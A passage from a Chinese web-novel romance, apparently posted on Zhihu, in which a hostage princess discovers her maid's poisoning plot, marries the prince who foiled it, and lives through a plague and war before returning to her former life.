很快便又虚空下坠，落在了地面上。</p>\n<p>刚才是一切不复存在，此刻天空乌云密布，天雷从空中一道道直直地砸下。</p>\n<p>每落下一道惊雷，广袤无垠的大地上便是一个深坑，可怖得很。</p>\n<p>潜意识告诉我，那些天雷是冲我而来的。</p>\n<p>为什么？</p>\n<p>我做错了什么？</p>\n<p>这里是哪里？</p>\n<p>我向四周张望，才发现不远处，还有一个男人。</p>\n<p>他身上似乎带着很重的伤，但脸孔模糊不清，也不知道我到底认不认识。</p>\n<p>他是谁？</p>\n<p>是敌人，还是盟友，或是陌生人？</p>\n<p>我呆在原地，那个男人突然转过头，朝我大喊：“楼伽蓝！快跑！别回头！千万别回头！”</p>\n<p>“愣着干什么？笨死了！跑啊！跑！”</p>\n<p>也不知道是什么情况，听见这话，虽然还搞不清楚现在的状况，我赶紧跑了起来。</p>\n<p>没跑几步，就是一个踉跄，我倒在地上。</p>\n<p>身后似乎有热量袭来，我忘记了刚才那个男人的话，回头一看。</p>\n<p>一道带着电光的惊雷，直接贴到了我的眼前！</p>\n<p>“啊！”</p>\n<p>我直接被吓醒了。</p>\n<p>这才发现......原来只是梦。</p>\n<p>我的眼前，现在居然是瀛玉的脸。</p>\n<p>再一转眼，他的身边，还放着新鲜出炉的辣子鸡糖醋里脊蒜香扁豆银耳桂花羹……</p>\n<p>我还没从刚才的噩梦中缓过神来，盯着瀛玉那张好看的脸，张了张口，却什么也没说出来。</p>\n<p>“怎么不说话？”瀛玉哂笑一声。</p>\n<p>“看见我，高兴到连话都说不出来了？”</p>\n<p>我：“......”</p>\n<p>16.</p>\n<p>我又深呼吸了几口，终于缓过了神，从榻上坐了起来：“不是，刚刚做噩梦了。”</p>\n<p>“瀛玉，你总是来无影去无踪的，平日里是不是仗着自己武功了得，都爱好随随便便进女孩子的房间？”我眯起眼睛。</p>\n<p>瀛玉皱起眉：“笨死了，我会那么无聊？我做的都是正经事。”</p>\n<p>“那你来干什么？”我眼睛往旁边一瞥：“还带这么多好吃的。”</p>\n<p>有一说一，瀛玉这句“笨死了”，跟我梦里那个男子的声音，倒是有几分相似。</p>\n<p>“昨天看你喝多了，今早担心你健康，就过来看看。”</p>\n<p>“这些吃的也都是随便拿的，看你在上回皇兄生日宴上很喜欢吃这些，就拿了些来。”</p>\n<p>“如果没什么事儿，我就先走了。”</p>\n<p>“欸，等等。”我可能是还有点没睡醒，竟直接去拉了他的袖子。</p>\n<p>瀛玉一挑眉，我连忙松开手，脸有点红扑扑的：“不是，我就想谢谢你，昨天送我回来。”</p>\n<p>“不客气，举手之劳。”瀛玉顿了顿：“就是下次，千万别跟不熟悉的人喝酒。”</p>\n<p>“为什么？”</p>\n<p>瀛玉“啧”了一声：“笨。你酒量差，一喝醉就乱说胡话，让别人听了，影响实在不太好。”</p>\n<p>我嘴角抽搐了一下，心里不知怎的有一种不好的预感：“我说什么了？”</p>\n<p>“我复述出来的话，会很奇怪。”瀛玉看了我一眼：</p>\n<p>“起来赶紧吃点东西，我等会还得去找父皇一趟。”</p>\n<p>“你要主动去找皇上？不会......不会被赶出来吗。”</p>\n<p>我话说到后面有点虚。</p>\n<p>瀛玉：“......我走了。”</p>\n<p>后面的几天，瀛玉居然经常出没于皇宫之中。</p>\n<p>父子俩是要和好了么？</p>\n<p>我很惊讶，同时又很为瀛玉开心。</p>\n<p>毕竟，他的太子之位被废，本就是不该的。</p>\n<p>刍荆的皇帝深爱妻子，本是美好之事，不该由瀛玉来承担本不该属于他的痛苦。</p>\n<p>偶尔，我又会听见疏桐说，二皇子跟皇上今天又大吵一架。</p>\n<p>唉，真是对他没辙了，有什么话不能好好说呢？</p>\n<p>不过近日，我总会睡前在枕头下面，发现几样新奇的小玩意儿。</p>\n<p>能做出这种事的，除了瀛玉，也没谁了。</p>\n<p>他就这么爱进女孩子的屋？</p>\n<p>无聊死了。</p>\n<p>不过他带来的小东西，倒是挺好玩的，就暂且原谅他啦。</p>\n<p>17.</p>\n<p>这天晚上，我的窗前，落了一只鸽子。</p>\n<p>是疏桐发现的，她急匆匆地将鸽子拿到我手里：</p>\n<p>“公主，楼岚国的信，总算来了。”</p>\n<p>我满脑子都是今晚有乳鸽吃，听见疏桐的话，有些没懂：</p>\n<p>“什么叫做，总算来了？”</p>\n<p>疏桐眼神有些飘忽：“一直没跟公主说起这件事，皇上让我在收到回信之前，都千万不要将此事告知公主。”</p>\n<p>“其实咱们来刍荆，是有要事在身的。”</p>\n<p>“什么意思？”</p>\n<p>我心中隐隐有些不安。</p>\n<p>“自从我们来到刍荆国，我每周都会向楼岚传信，我早在中秋宴上就给玉蝶酥下过慢性药，在座的皇子公主都即将不久于人世。”</p>\n<p>“解药我早就混在日常饭食里为公主服下，公主尽管放心，您的身体安康。”</p>\n<p>“届时刍荆国大乱，我们便可乘乱逃跑，会有楼岚的人来接应我们。”</p>\n<p>我怎么也没想到，跟着我这么多年的丫头，居然是个行动如此神不知鬼不觉的间谍？</p>\n<p>看她每天睡得香喷喷的，怎么背后做了这么多事？</p>\n<p>我突然有些怕她。</p>\n<p>“你是说......参加了中秋宴上，所有的人？”</p>\n<p>疏桐握住我的手：</p>\n<p>“公主，你傻呀！我们到底是楼岚的人！”</p>\n<p>“你想想，这么多年，皇上都不看重我们，我们总得做点什么，才能往上爬，让那些曾经看不起我们的人后悔！”</p>\n<p>“这不是公主您一直想要的吗？”</p>\n<p>“可......可是......”</p>\n<p>我有些迷茫了：“可是刍荆的人他们没有做错什么啊，瀛季人很好的，他的妻子好温柔啊，瀛小妹妹我们不是总跟她一起玩的么，还有......”</p>\n<p>还有......还有瀛玉呢。</p>\n<p>瀛玉？</p>\n<p>我突然想到，瀛玉大概是没有事的。</p>\n<p>他没有参加中秋宴，不知道他那天跑哪儿去了。</p>\n<p>“九公主！楼伽蓝！”</p>\n<p>疏桐情急之下居然喊了我的名字，我被她吓了一跳。</p>\n<p>疏桐在我身前跪了下来：</p>\n<p>“公主若还记得自己是哪里的人，便莫要心软。这事既然已经做下了，那若是被发现，疏桐与公主，皆免不了一死，公主可要想清楚。”</p>\n<p>我沉默了。</p>\n<p>“公主，疏桐想做出点东西，让他们看看，我们不该被小看。”</p>\n<p>疏桐又给我磕了一个头：</p>\n<p>“求求公主了。”</p>\n<p>我叹了一口气：“你下去吧。”</p>\n<p>“公主......下个月初，刍荆的人身体内的毒就都会......”</p>\n<p>“我让你下去！”我加重了语气。</p>\n<p>“......是。”</p>\n<p>18.</p>\n<p>疏桐一走，我便坐在榻上哭了起来。</p>\n<p>怎么办？</p>\n<p>我到底该怎么办？</p>\n<p>说出去是我死，不说的话就是他们死。</p>\n<p>我才来了从桂花还没开时来到刍荆，就感受到了周围人许多的关爱。</p>\n<p>刍荆的皇子公主，他们之间的亲和友爱，是我从未触及过的美好。</p>\n<p>这是我十六年来都如此想要的东西，好不容易得到了，桂花都还没有到凋谢的时令，就这么快就又要失去这些吗？</p>\n<p>我......不想这样。</p>\n<p>突然一道男生横插进来：“这是怎么了？哭了？嗯？”</p>\n<p>我一惊，抬头，瀛玉却已经从窗户翻了进来。</p>\n<p>瀛玉见到我哭肿的眼睛，好看的眉眼蹙了起来：</p>\n<p>“怎么眼睛红成这样，真跟只小兔子一样了。”</p>\n<p>“楼伽蓝，告诉我，到底怎么回事？”</p>\n<p>他逆着月色，微光将他周身镀上了一层柔软，让瀛玉整个人都看起来温柔极致。</p>\n<p>那双桃花眼此刻满是缱绻，但若是我告诉他，不出半月，他的兄弟姐妹就都要死了，他会不会现在就杀了我？</p>\n<p>虽然不想承认，但大概是会的。</p>\n<p>我与瀛玉之间的羁绊，说浅不浅，说深不深。</p>\n<p>但不知不觉间，我也不知道是为什么，从什么时候开始的。</p>\n<p>他似乎变成了在我身边，令我依赖感最强的人了。</p>\n<p>“不想说？”瀛玉摸了一把我的脑袋。</p>\n<p>“有点想......但又有点不想。”</p>\n<p>“没准备好那就不说了。”瀛玉很轻地笑了一声：“对了，之前给你送的小玩意儿，都收到了？”</p>\n<p>“嗯。”我点点头。</p>\n<p>“不回个礼给我？”</p>\n<p>“啊？”我低下声音：“你这个人怎么这样，还反过来主动要东西的。”</p>\n<p>“不可以吗？”</p>\n<p>“也不是不可以。”我琢磨了一下，起身从柜子里找出一个小盒子递给他。</p>\n<p>“我先前闲的没事，在楼岚的时候自己雕了一个玉佩，虽然粗糙了点，但也还不错。”</p>\n<p>我咬了咬下唇：“你若不嫌弃，那就拿去。”</p>\n<p>瀛玉打开木盒的盖子，取出那一枚小小的白色玉佩。</p>\n<p>“这么好的东西，为何不要？”瀛玉手腕一收，将那玉佩攥进手心：“我收下了。”</p>\n<p>19.</p>\n<p>就在那一刻。</p>\n<p>真的就是那么一瞬间，我突然觉得，可能自己的选择，早就已经明了了。</p>\n<p>只是我还在虚假地与自己作斗争，用死亡的威胁去试图劝阻自己。</p>\n<p>楼岚，真的值得我和疏桐，为它做这些吗？</p>\n<p>根本不值得的。</p>\n<p>“瀛玉。”</p>\n<p>“我在。”</p>\n<p>我叹了口气：“带我去摘月轩吧，我跟你说件事。”</p>\n<p>瀛玉点头，朝我伸出手。</p>\n<p>我赶紧后退一步：“你干嘛！”</p>\n<p>“带你走啊，不然呢？”瀛玉的眼神又开始嫌弃了：“你要自己用腿走过去？那得多久。”</p>\n<p>我吐了一口气：“我还以为你现在就要杀了我。”</p>\n<p>瀛玉被我气笑了：“你在想什么呢？我平白无故杀你作甚？”</p>\n<p>我不去看他：</p>\n<p>“等会我说了，你可能就想杀我了。”</p>\n<p>瀛玉将我抱起，往外一跃。</p>\n<p>“那也得等你说了，我再考虑。”</p>\n<p>瀛玉轻功了得，我第一次如此近距离地感受。</p>\n<p>切身体会四个字，今天我才知道原来是这种感觉。</p>\n<p>瀛玉的胸口那样温热，他的脸离我那样近。</p>\n<p>他真的好好看啊，我真遗憾没能见到刍荆的先皇后长得是什么模样。</p>\n<p>一定是如天仙一般吧，跟我之前梦里的女子，一定是不相上下的，或者更胜一筹。</p>\n<p>否则，瀛玉怎么能生得如此好看？</p>\n<p>我承认，我动心了。</p>\n<p>只是很可惜。</p>\n<p>这份动心才刚刚开始，便要强制性地结束。</p>\n<p>20.</p>\n<p>“到底要说什么？”</p>\n<p>我才刚开了个头，说了两个字，眼泪看着就要往下掉。</p>\n<p>瀛玉捕捉到我的眼神，皱起眉似乎想给我擦眼泪，我在他伸手之前强行将眼泪憋了回去。</p>\n<p>“瀛玉，你赶紧告诉你父皇还有兄弟姐妹，他们都中毒了。”</p>\n<p>“中秋夜宴上，疏桐......疏桐她......我先在这里替她道歉，总之是要面对的。”</p>\n<p>“疏桐在玉蝶酥上下了楼岚特制的毒药，要过很久才会发作，现在去找解药还来得及！”</p>\n<p>我说完了，瀛玉却并没有像我想象当中一样，露出很凝重的表情，或者是急急忙忙地离开。</p>\n<p>他就这么看着我：“说完了？”</p>\n<p>我呆呆地点头：“你怎么还不走？”</p>\n<p>这不会是传说中，暴风雨前的宁静吧？</p>\n<p>我叹了一口气：“还是说，你想先杀了我？”</p>\n<p>“说什么呢，笨死了。”瀛玉叹了一口气：“我说你，刚知道么？”</p>\n<p>我迟疑了一下，点了点头：“对不起。”</p>\n<p>“你有什么对不起的？又不是你做的。”</p>\n<p>瀛玉揉了一把我的脑袋：“你知道是中秋夜宴为什么没来么？”</p>\n<p>“啊？”我有点不明白了，瀛玉没事儿扯这个干什么？</p>\n<p>“在中秋宴之前，我其实一直对你和疏桐抱有很深的揣测。”</p>\n<p>“我......”说实话，我完全没看出来。</p>\n<p>“是不是想说没看出来？那肯定啊，要是怀疑你们还能被你看出来，我白长这么大了？”</p>\n<p>瀛玉失笑：“后来与你的接触，我彻底确定了，疏桐和你，在楼岚那边，完全是不同的角色。”</p>\n<p>这下已经说得明显地不能再明显了，我瞪大眼睛：“你早就知道疏桐有问题？不是，你怎么看出来的？我和她认识好多年了，都没看出来她的不同！”</p>\n<p>“笨的你。”瀛玉又骂我，可我却绝对他说话好温柔。</p>\n<p>“那玉蝶酥......”</p>\n<p>瀛玉笑笑：“中秋宴那天，我去换掉了疏桐房中的药。”</p>\n<p>“至于怎么处置她.......我可以为了你原谅她，只要她保证不再犯，并且想办法联系楼岚，告知他们计划失败了。”</p>\n<p>“所以辟个谣，我不是爱偷偷进女孩子的房间。”</p>\n<p>“只是为了查探你们的底细，所以那段时间，我经常来。”</p>\n<p>“主要是去看疏桐的房间，你的房间......我只是想见你。”</p>\n<p>“放心吧，我们都没事，不会有人死的。”</p>\n<p>瀛玉托着我的脸，将眼角的泪轻轻拂去。</p>\n<p>“别哭了，都红成兔子眼了，笨不笨啊你。”</p>\n<p>21.</p>\n<p>我百思不得其解。</p>\n<p>“瀛玉，你为什么这么做？我值得你这么做吗？”</p>\n<p>“笨死了，真是的。”</p>\n<p>瀛玉有些恨铁不成钢地看着我：</p>\n<p>“动动你那兔子都不如的脑袋，好好想一想，我对你这么好，还能是因为什么？”</p>\n<p>“因为......因为什么啊？”</p>\n<p>我一头雾水。</p>\n<p>瀛玉俯下身，一双桃花眼直勾勾地盯着我。、</p>\n<p>我刚想往后退，就被他一把扶住背部，往自己身上靠：</p>\n<p>“当心点，在屋顶呢，别摔下去。”</p>\n<p>“我之前不是说了么，你这么蠢，要是不靠和亲，估计也没人要你。”</p>\n<p>“你本就注定该是我的妻，我一早便认定了你，怎会将你放跑？”</p>\n<p>“既然你想做皇后，我便跟父皇主动去要了个太子当当。”</p>\n<p>“过程......不说了，不太顺利，但现在算是能定下了。”</p>\n<p>“虽然被我父皇骂得狗血淋头，但现在看见你，觉得倒也挺值得，简直是赚大发了。”</p>\n<p>“我皇兄也不想当皇帝，这苦差事，我们兄弟似乎都不太爱接。”</p>\n<p>“不过既然我的小兔子喜欢，那我还是就勉为其难，当一当太子吧。”</p>\n<p>“明日，圣旨一出，我这太子就能做回来了。”</p>\n<p>“唉，你能不能别哭了？你哭起来也挺好看的，但笑起来更可爱啊。”</p>\n<p>“楼伽蓝，你冲我笑一笑，行不行？你好像没怎么对我笑过。”</p>\n<p>我努力朝他挤出一个笑来。</p>\n<p>遭到了瀛玉满脸嫌弃：“这么勉强，算了算了，你哭吧。”</p>\n<p>我的脸立马拉了下去，瀛玉失笑，又捏了捏我的脸。</p>\n<p>“言归正传了啊。”</p>\n<p>“所以，我现在要问问你。”</p>\n<p>“楼伽蓝，这个太子妃的位置，你有没有兴趣？”</p>\n<p>瀛玉笑着对我说。</p>\n<p>那一刻我还以为是梦。</p>\n<hr>\n<h3>22.</h3>\n<p>第二天，圣旨就下来了。</p>\n<p>听说瀛玉连跪都没跪，太监还在读旨意呢，他顺手就将对方手里的卷宗一抽，直接朝我的宫殿方向去。</p>\n<p>他前脚刚到我的寝殿大堂，后脚赐婚的旨意也就到了。</p>\n<p>我连忙跪下，瀛玉这回也同我一起跪下来。</p>\n<p>“奉天承运，皇帝诏曰。”</p>\n<p>“刍荆国太子瀛玉，才貌双绝，谨遵礼法；楼岚国九公主楼迦蓝，蕙质兰心，国色天香。”</p>\n<p>我心道：真能吹。</p>\n<p>悄悄偏头看一眼瀛玉，后者似乎也在憋笑。</p>\n<p>“才子佳人，确为良配。”</p>\n<p>“皇上今日即为太子和九公主赐婚，预祝太子与太子妃和和美美，百年好合。”</p>\n<p>“——钦此！”</p>\n<p>我刚收回目光，手背上便触碰到一片温热。</p>\n<p>是瀛玉握住了我的手。</p>\n<p>然后，他牵着我，站直了身体。</p>\n<p>这是我第一次站着接过圣旨。</p>\n<p>刍荆国可以这样的吗？</p>\n<p>看那传话太监的表情，大概不是的。</p>\n<p>只有刍荆国太子敢这么嚣张。</p>\n<p>现在还要带着他的太子妃，一起目无尊法。</p>\n<p>刚刚还读的“谨遵礼法”呢？</p>\n<p>果然就是皇帝写着玩儿的吧。</p>\n<p>我来的时候，以为我要当着这个质子好多年，等他们那总角之年的皇弟再长两岁，然后履行我和亲的义务。</p>\n<p>谁能想到呢？</p>\n<p>我一个哪哪儿都不行，处处不受宠的公主，作为质子押在异国他乡，到头来，有一天却突然要做他们的太子妃。</p>\n<p>大抵，从我出生到现在，所有的运气都用来遇见瀛玉了吧。</p>\n<p>23.</p>\n<p>大婚之夜。</p>\n<p>我披着红盖头，心算着传信的大概已经到了楼岚国。</p>\n<p>今日还不到寅时，我就被疏桐拉着起床了。</p>\n<p>看来无论怎么样，成亲的规矩都是多的，况且还是本国太子的婚礼。</p>\n<p>怎么这么久还不来？</p>\n<p>等得久了，我都有点昏昏欲睡了起来，头像小鸡啄米似的一点，再一点。</p>\n<p>“咔沓。”</p>\n<p>我隐约听到门外疏桐问好的声音，门帘被掀起来的一瞬间，上面的珠子相互碰撞，发出清脆的响声。</p>\n<p>是瀛玉。</p>\n<p>我眼前还是红红的一片，只隐隐约约看得清瀛玉的轮廓。</p>\n<p>还没回过神，瀛玉的手已经伸进红盖头，轻轻地一抬。</p>\n<p>他的脸，在我眼前渐渐清晰。</p>\n<p>瀛玉轻笑一声：“楼迦蓝，你这人怎么这样，等我也能等得困么？”</p>\n<p>“我寅时就被疏桐拉起来了，这个头冠太沉了，压得我困。”</p>\n<p>我噘着嘴跟他争辩。</p>\n<p>“嗯，我要再早一点。”</p>\n<p>“你起那么早干什么？”我不理解。</p>\n<p>瀛玉的嘴角带了点暧昧的笑意，他说：“我兴奋地根本没睡。”</p>\n<p>我：“……”</p>\n<p>瀛玉笑着在我身边坐下，抬起细长的手指，一点一点帮我将头顶的发饰取下来。</p>\n<p>他动作很慢，我哪怕是皱一点眉头，他都能发现，然后问是不是他揪到我头发了。</p>\n<p>发钗尽数被拿了下来，青丝散落在床上，还有我的身上。</p>\n<p>瀛玉抬手伸向扣子的时候，我下意识地脱口而出：“你干嘛？”</p>\n<p>瀛玉这回看我的目光，比以往任何一次，都要意味深长。</p>\n<p>“你说呢？”瀛玉低笑：“太子妃？”</p>\n<p>我脸一红，才发现刚刚那句属实像个笨蛋。</p>\n<p>红帐纱幔摇晃，烛火灭了一茬。</p>\n<p>瀛玉的手碰到我脖颈的那一刻，我条件反射地往后缩了缩。</p>\n<p>“别怕。”</p>\n<p>他的唇覆上来，一开始我全身僵硬，到后面竟也放松下来。</p>\n<p>“没事，阿蓝。”瀛玉在我耳边厮磨：“疼就喊出来。”</p>\n<p>“唔......不是......”</p>\n<p>“不疼？”</p>\n<p>我抽噎着：“疼。”</p>\n<p>“可以叫。”</p>\n<p>“我能忍着......”</p>\n<p>“那，舒服也喊出来，阿蓝，我想听。”</p>\n<p>我：“......”</p>\n<p>“脸这么红？”瀛玉在我耳边喘气。</p>\n<p>“竟有这么累么？”</p>\n<p>我想让他闭嘴！</p>\n<p>这人怎么床上话那么多？</p>\n<p>瀛玉的脸与我近在咫尺。</p>\n<p>可我就算是想打他，也早就没了力气。</p>\n<p>一夜春宵，再醒来已是日上三竿，疏桐悄悄推开门，见我醒了，喜上眉梢。</p>\n<p>“公主......太子妃醒了？太子去请安了，说让您睡到自然醒，身子累就不用去给皇上请安了，反正也就是走个形式，刍荆不太在意这个。”</p>\n<p>“太子还说，皇上亲口说让太子妃好好休息，这不，大堂里已经全是御赐的补品了！”</p>\n<p>我纳闷：这成个亲，怎么像是要准备坐月子一般......</p>\n<p>“哎呀，话说多了，疏桐这就去给公主打热水来！”</p>\n<p>疏桐一拍手，连忙转身跑走。</p>\n<p>我撑着手臂，强行坐起来，腰酸背痛。</p>\n<p>嘶，头疼，腿麻。</p>\n<p>瀛玉到底是什么做的，一次又一次地不停......</p>\n<p>再一看，我身上的红痕哪里都是。</p>\n<p>拿铜镜一照——</p>\n<p>我自己都看不下去了。</p>\n<p>瀛玉这还让我怎么见人？</p>\n<p>气死我啦！</p>\n<p>24.</p>\n<p>成亲之后，我才知道，刍荆居然有这么多只有皇子知道的密道。</p>\n<p>瀛玉的房间也有一个小小的密室，以备情急之需。</p>\n<p>可是安乐日子没过几天，刍荆突然迎来了一场规模不小的瘟疫，说是有好几十位居民，在昨日突然暴毙了。</p>\n<p>瀛玉不让我出门，自己在外面跑来跑去，三天过去了，终于才回了一次宫。</p>\n<p>但也只是陪了我一小会，让我不要担心，然后又急急忙忙地再跑出去。</p>\n<p>听把守在门口的侍卫说，现在进出城门十分森严，才只三天，城门外已经死了上千百姓，怨声已经载道。</p>\n<p>我叹了口气，真是一波未平，一波又起。</p>\n<p>“也不知道是怎么流传的，至今没查出是城中哪里有问题，城外面又太空旷，无处可查。”</p>\n<p>侍卫这么对我说道。</p>\n<p>“确定不是城内的原因？”</p>\n<p>“应该不会，咱们刍荆城内的东西都是经过严格审查的，只有可能谁从城外带了不干净的东西回来吧？”</p>\n<p>我突然想到一件事。</p>\n<p>小时候我们在楼岚，曾经也经历过一次瘟疫。</p>\n<p>当时，是有敌国间谍将死蝙蝠丢进了酒里。</p>\n<p>酒......水......城内......城外......</p>\n<p>我猛地向寝殿内跑去。</p>\n<p>“疏桐！出来！”</p>\n<p>“现在就过来！我有话要问你！”</p>\n<p>其他的侍女看见我的样子，都吓了一大跳，静默着不敢说话。</p>\n<p>突然，就在这时，宫外响起沉重的号角声。</p>\n<p>几乎只是片刻之间，屋外突然一声巨响。</p>\n<p>“砰！”地一声，将整座刍荆国惊醒。</p>\n<p>“全城戒备！有敌袭——”</p>\n<p>我愣在原地，满脸惊恐。</p>\n<p>楼岚来攻刍荆了？</p>\n<p>不可能，不可能的啊！</p>\n<p>他们明明已经被疏桐通知过，计划失败，不可能攻城！</p>\n<p>还是说......还有什么我不知道的事？</p>\n<p>我万万没能想到，楼岚居然急不可耐成这样！</p>\n<p>是我猜的那样吗......</p>\n<p>可是，他们明明知道，我才刚和瀛玉成了亲！我才成了亲啊！</p>\n<p>如果刍荆真的灭了，楼岚国要我怎么办？</p>\n<p>我怎么办？</p>\n<p>25.</p>\n<p>我迅速推开房门，疏桐却已经跪在中央。</p>\n<p>“真的是你？”我的声音颤抖着：“疏桐，我待你从来不薄，你是不是疯了！”</p>\n<p>疏桐摇摇头：“疏桐知错了，可这些......是早在之前就下的。”</p>\n<p>我才知道，原来疏桐不止给中秋宴上的人下了毒。</p>\n<p>早在更早之前，她那些从楼岚带来的药还没有被瀛玉换掉时，疏桐已经在出宫采买的路上，在城外的野井中多次下过药。</p>\n<p>刍荆国不像楼兰国，不许野乞入城，而是采取开放的制度，尽可能地接纳无家可归之人。</p>\n<p>乞丐喝了外面的井水，再进入刍荆......</p>\n<p>病发，只是时间问题。</p>\n<p>它就像一座活火山，迟早会有爆炸的一天。</p>\n<p>“公主......”疏桐这次没叫我太子妃。</p>\n<p>“信我，来不及了。”</p>\n<p>“太子发现我的事情时，我就知道，无论杀我与不杀，刍荆都是要死很多人的。”</p>\n<p>“楼岚太想灭刍荆了，他们一定会发起这场战争的，公主，我们没有办法阻止。”</p>\n<p>战火四起。</p>\n<p>我相信这个时候，但凡有点脑子的，也应该想得出这个毒是谁下的了。</p>\n<p>瀛玉......应该会很失望吧。</p>\n<p>疏桐拉着我的衣角，眼泪从她眼角落下来。</p>\n<p>“公主！他们现在肯定已经知道了毒的源头是楼岚！我们赶紧先藏起来！”</p>\n<p>我甩开她：“我要等瀛玉！”</p>\n<p>疏桐哭起来：“您还要等什么啊？他先是刍荆的太子，而后才是你的丈夫！他怎么可能一而再再而三地保护敌国的人，公主，您是不是傻啊！”</p>\n<p>“家国面前，爱人又有何轻重！”</p>\n<p>“现在我们只能想办法自保，刍荆已经死了很多人，楼岚已经打进来了，刍荆迟早要灭！”</p>\n<p>“他杀你还来不及！”</p>\n<p>“现在太子一定已经去前线打仗了，杀也好，救也好，哪来的时间管咱们！”</p>\n<p>我浑身发冷，疏桐拉起还在发呆的我，一起藏进了瀛玉告诉过我们的密室里。</p>\n<p>26.</p>\n<p>密室内，还能听得见外面一些声响。</p>\n<p>果然有卫兵来找我们，说这楼岚国的公主到底是去哪儿了，还想抓起来得皇帝的赏赐呢。</p>\n<p>我们在狭小的密室里，躲了三天三夜。</p>\n<p>然后，食物和水都耗尽了。</p>\n<p>我们必须得出去了。</p>\n<p>夜深人静之时，我们悄悄将门打开，却惊动了侍卫。</p>\n<p>“九公主，保护好自己，我们在原来住的地方汇合！”</p>\n<p>疏桐说完这句话，立即朝另一个方向跑。</p>\n<p>我在惊呼出声的前一刻，捂住了嘴巴。</p>\n<p>我知道事关紧急不能再纠结，也决不能白白浪费疏桐为我争取的时间。</p>\n<p>通过之前瀛玉说过的密道，我跑了好久，终于才到了我刚来刍荆时的住处。</p>\n<p>我找到了一些食物和水，吃了几口后，实在撑不住，便昏睡了过去。</p>\n<p>醒来时，大堂内一片金碧辉煌，却没了生气。</p>\n<p>我偏过头，看见了铜镜里的自己。</p>\n<p>有那么一个瞬间，我觉得自己在镜子里有些奇怪。</p>\n<p>可是说不上来是哪里。</p>\n<p>仔细看，是很漂亮，也很破碎的一张脸。</p>\n<p>脸上有些脏了，我才发现已经几天没有洗过脸。</p>\n<p>这个环境，好像有些似曾相识......</p>\n<p>是梦里梦到过吗？</p>\n<p>好像又没有。</p>\n<p>这时，屋外似乎有走路声。</p>\n<p>我的心提到了嗓子眼，可我发现得太晚，已经没有时间再去藏身。</p>\n<p>终于，我看清了来人。</p>\n<p>他似乎很疲惫，脸上也沾着些血迹。</p>\n<p>外面还在打仗，他怎么脸盔甲都没有？</p>\n<p>还好身上没什么血迹，应该没受伤吧，他武功那么好。</p>\n<p>他逆着天光，手上的一柄长剑一侧已经被血染红。</p>\n<p>剑柄末尾，还挂着一枚白色的玉佩。</p>\n<p>瀛玉看见我，如释重负地松了一口气。</p>\n<p>“担心死了，还好找到了。”</p>\n<p>然后，他向我伸出手。</p>\n<p>“楼伽蓝。”</p>\n<p>“我来接你了。”</p>\n<p>【除了 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/11fff90d0571031c890c78d61e840710\" data-hash=\"11fff90d0571031c890c78d61e840710\" data-hovercard=\"p$b$11fff90d0571031c890c78d61e840710\">@阿洛</a> 的谢邀，还要感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/20fb7fb2cead6efbe85f5caad3ec3a9c\" data-hash=\"20fb7fb2cead6efbe85f5caad3ec3a9c\" data-hovercard=\"p$b$20fb7fb2cead6efbe85f5caad3ec3a9c\">@是吖浩哇</a> 的邀请！超级蟹蟹！阿郁真的好开心！】</p>\n<p>【好啦，这篇是个神话文，前世轮回即将结束，回到现世~】</p>\n<hr>\n<h3>27.</h3>\n<p>我的眼泪像是流不尽，一见到他，所有的委屈都铺天盖地地袭来。</p>\n<p>瀛玉抚摸着我的发顶：“没事了，我们快走。”</p>\n<p>“等，等等！”我才想起来，疏桐还没有来：“我要再等等疏桐。”</p>\n<p>瀛玉皱起眉：“等她？我们来不及。”</p>\n<p>“不行！就......再等一会，就一会！一个时辰？”</p>\n<p>虽然疏桐大错特错，的确应该得到惩罚。</p>\n<p>可她还是救了我，不该就直接被弃之不顾。</p>\n<p>瀛玉的眉头依然蹙着，最后他淡淡地开口：</p>\n<p>“半个时辰，最多。”</p>\n<p>“好！”</p>\n<p>半个时辰过得很快，还好，疏桐终于回来了。</p>\n<p>她带了一身的伤，还说自己没事。</p>\n<p>瀛玉不放心地看了疏桐一眼，一块儿把我们送到了他以前的寝殿，嘱咐我们千万不要出去。</p>\n<p>我悄悄地问瀛玉：“一切结束了之后，疏桐的命，还能保下来吗？”</p>\n<p>瀛玉不说话。</p>\n<p>我知道，应该是不行了。</p>\n<p>而且，如今最大的事情，是战争的结局，还不知道会是谁赢谁输。</p>\n<p>若是楼岚赢了，疏桐的命应该还能保住。</p>\n<p>可是，楼岚若是赢了，整个刍荆......</p>\n<p>我身为楼岚九公主，却根本没法站在我的母国这一边。</p>\n<p>他们，真的错得太多了。</p>\n<p>“瀛玉。”我闭上眼睛：“对不起。”</p>\n<p>“你又没做错什么，不用跟我说对不起。”</p>\n<p>瀛玉叹了口气：“我再派个心腹跟着你们，我要走了。”</p>\n<p>“不用了，所有的武力，都要集中在前线。”</p>\n<p>我看着远方的战火，一字一顿。</p>\n<p>“瀛玉，一定要赢下这场仗啊。”</p>\n<p>他握着我的手，在我唇边轻轻落下一吻。</p>\n<p>“好，阿蓝。”</p>\n<p>“你要好好地，等我回来。”</p>\n<p>28.</p>\n<p>瀛玉走后，我便睡着了。</p>\n<p>不过我觉得这一觉，很不对劲。</p>\n<p>好像是睡了很久才起来，并且醒的时候，还睁不开眼睛。</p>\n<p>当我终于睁开眼，映入眼帘的是我房间的那副字画时，我就懂了。</p>\n<p>没错，我的房间。</p>\n<p>我在楼岚时，那个房间。</p>\n<p>我回来了。</p>\n<p>“啪塔！”</p>\n<p>我抬眼看去，门口疏桐手中的玉蝶酥落了一地。</p>\n<p>“出去。”</p>\n<p>在疏桐开口之前，我便下了逐客令。</p>\n<p>“公主，我下辈子再给您做牛做马，行吗。”</p>\n<p>“滚。”</p>\n<p>疏桐跪在地上给我磕头，每一下都很重.</p>\n<p>很快，她的额头上便有了很深的血坑，皮开肉绽。</p>\n<p>“我真的还不想死啊，我不想死!对不起！公主！”疏桐哭着，求我原谅。</p>\n<p>“无论刍荆被不被灭，公主您都不会有性命危险，可是刍荆一旦赢了，疏桐必死无疑！”</p>\n<p>“太子是不会放过我的！公主！疏桐跟您那么久，您体贴体贴疏桐这一次吧！”</p>\n<p>我别过脸去.</p>\n<p>“别拿你这个样子恶心我。”</p>\n<p>疏桐那天晚回来与我汇合，是因为遇见了楼岚的对接人。</p>\n<p>他们在瘟疫开始之前，早就伪装乞丐混进了刍荆。</p>\n<p>疏桐是没错的。</p>\n<p>求生是人的本能，若是一直留在刍荆，她只有一死。</p>\n<p>但若是回了楼岚，她还有一线生机。</p>\n<p>可我怎么原谅她？</p>\n<p>不可能啊。</p>\n<p>我最后让她以后不要再出现在我的